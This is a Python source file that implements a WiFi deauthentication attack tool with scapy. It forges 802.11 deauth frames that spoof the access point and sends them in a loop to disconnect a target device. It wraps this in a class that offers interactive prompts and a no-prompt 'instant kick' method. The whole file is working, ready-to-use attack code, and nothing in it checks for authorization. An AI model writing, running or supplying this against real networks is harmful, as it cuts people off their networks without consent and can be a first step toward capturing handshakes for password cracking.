import time
import re
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
from typing import Optional

def send_deauth(target_mac: str, gateway_mac: str, interface: str, num_packets: int = 50) -> None:
    """
    Send deauthentication packets to kick a device off the network.
    
    Args:
        target_mac: MAC address of the target device
        gateway_mac: MAC address of the access point
        interface: Network interface in monitor mode (e.g., wlan0mon)
        num_packets: Number of deauth packets to send
    """
    import platform
    
    # Check if we're on Windows
    if platform.system() == "Windows":
        print(f"\n⚠️  Windows Compatibility Notice:")
        print(f"   Deauthentication attacks require specialized tools on Windows.")
        print(f"   This feature works best on Linux systems with monitor mode support.")
        print(f"   Consider using tools like Aircrack-ng suite on Linux or WSL.")
        print(f"\n❌ Deauthentication not executed on Windows system.")
        return
    
    # Create the deauth packet
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    print(f"\nSending deauthentication packets to {target_mac}")
    print("Press Ctrl+C to stop...")
    
    try:
        for _ in range(num_packets):
            sendp(packet, iface=interface, verbose=False)
            # Small delay between packets
            time.sleep(0.1)
        print(f"\nSent {num_packets} deauthentication packets to {target_mac}")
    except KeyboardInterrupt:
        print("\nDeauthentication attack stopped by user.")
    except Exception as e:
        print(f"\nError during deauthentication: {str(e)}")

class DeauthAttack:
    """
    A class to handle deauthentication attacks on WiFi networks.
    Provides a user-friendly interface for the deauth functionality.
    """
    
    def __init__(self):
        """Initialize the DeauthAttack instance."""
        pass
    
    def _validate_mac_address(self, mac: str) -> bool:
        """
        Validate MAC address format.
        
        Args:
            mac: MAC address string to validate
            
        Returns:
            bool: True if valid MAC address format, False otherwise
        """
        # MAC address pattern: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX
        mac_pattern = r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$'
        return bool(re.match(mac_pattern, mac))
    
    def _validate_interface(self, interface: str) -> bool:
        """
        Basic validation for network interface names.
        
        Args:
            interface: Network interface name to validate
            
        Returns:
            bool: True if interface name looks valid, False otherwise
        """
        # Common interface patterns: wlan0, wlan0mon, eth0, etc.
        interface_pattern = r'^[a-zA-Z]+[0-9]+(?:mon)?$'
        return bool(re.match(interface_pattern, interface)) and len(interface) <= 15
    
    def _get_user_input(self, prompt: str, validator=None) -> str:
        """
        Get validated user input.
        
        Args:
            prompt: Input prompt message
            validator: Optional validation function
            
        Returns:
            str: Validated user input
        """
        while True:
            user_input = input(prompt).strip()
            if not user_input:
                print("Input cannot be empty. Please try again.")
                continue
            
            if validator and not validator(user_input):
                print("Invalid input format. Please try again.")
                continue
                
            return user_input
    
    def start_deauth(self, target_mac: str, gateway_mac: str = None, interface: str = None, num_packets: int = 50) -> None:
        """
        Start deauthentication attack against a target device.
        
        Args:
            target_mac: MAC address of the target device to deauthenticate
            gateway_mac: MAC address of the gateway/router (optional, will prompt if not provided)
            interface: Network interface in monitor mode (optional, will prompt if not provided)
            num_packets: Number of deauth packets to send (default: 50)
        """
        try:
            # Validate target MAC address
            if not self._validate_mac_address(target_mac):
                print(f"Error: Invalid target MAC address format: {target_mac}")
                print("MAC address should be in format: XX:XX:XX:XX:XX:XX or XX-XX-XX-XX-XX-XX")
                return
            
            print(f"\nPreparing deauthentication attack for target: {target_mac}")
            
            # Get gateway MAC address if not provided
            if not gateway_mac:
                print("Additional information required:")
                gateway_mac = self._get_user_input(
                    "\nEnter the gateway/router MAC address (BSSID): ",
                    self._validate_mac_address
                )
            else:
                if not self._validate_mac_address(gateway_mac):
                    print(f"Error: Invalid gateway MAC address format: {gateway_mac}")
                    return
            
            # Get network interface if not provided
            if not interface:
                print("\nNote: Interface must be in monitor mode (e.g., wlan0mon)")
                print("Common interfaces: wlan0mon, wlan1mon, etc.")
                interface = self._get_user_input(
                    "Enter the network interface in monitor mode: ",
                    self._validate_interface
                )
                
            else:
                if not self._validate_interface(interface):
                    print(f"Error: Invalid interface format: {interface}")
                    return
            
            print(f"\nStarting deauthentication attack:")
            print(f"Target MAC: {target_mac}")
            print(f"Gateway MAC: {gateway_mac}")
            print(f"Interface: {interface}")
            print(f"Packets: {num_packets}")
            
            # Call the existing send_deauth function
            send_deauth(target_mac, gateway_mac, interface, num_packets)
            
        except KeyboardInterrupt:
            print("\nDeauthentication attack cancelled by user.")
        except Exception as e:
            print(f"\nError during deauthentication setup: {str(e)}")
    
    def instant_kick(self, target_mac: str, gateway_mac: str, interface: str = "wlan0mon", num_packets: int = 50) -> bool:
        """
        Instantly kick a device without user prompts.
        
        Args:
            target_mac: MAC address of the target device
            gateway_mac: MAC address of the gateway/router
            interface: Network interface in monitor mode (default: wlan0mon)
            num_packets: Number of deauth packets to send (default: 50)
            
        Returns:
            bool: True if attack was successful, False otherwise
        """
        import platform
        
        try:
            # Check if we're on Windows first
            if platform.system() == "Windows":
                print(f"\n⚠️  Windows Compatibility Notice:")
                print(f"   Instant kick feature requires monitor mode support.")
                print(f"   This feature is not available on Windows systems.")
                print(f"   Consider using Linux or WSL for deauthentication attacks.")
                return False
            
            # Validate MAC addresses
            if not self._validate_mac_address(target_mac):
                print(f"Error: Invalid target MAC address format: {target_mac}")
                return False
                
            if not self._validate_mac_address(gateway_mac):
                print(f"Error: Invalid gateway MAC address format: {gateway_mac}")
                return False
            
            print(f"\n🚀 Instant kick initiated for {target_mac}")
            print(f"Gateway: {gateway_mac} | Interface: {interface} | Packets: {num_packets}")
            
            # Call the send_deauth function directly
            send_deauth(target_mac, gateway_mac, interface, num_packets)
            return True
            
        except Exception as e:
            print(f"\nError during instant kick: {str(e)}")
            return False
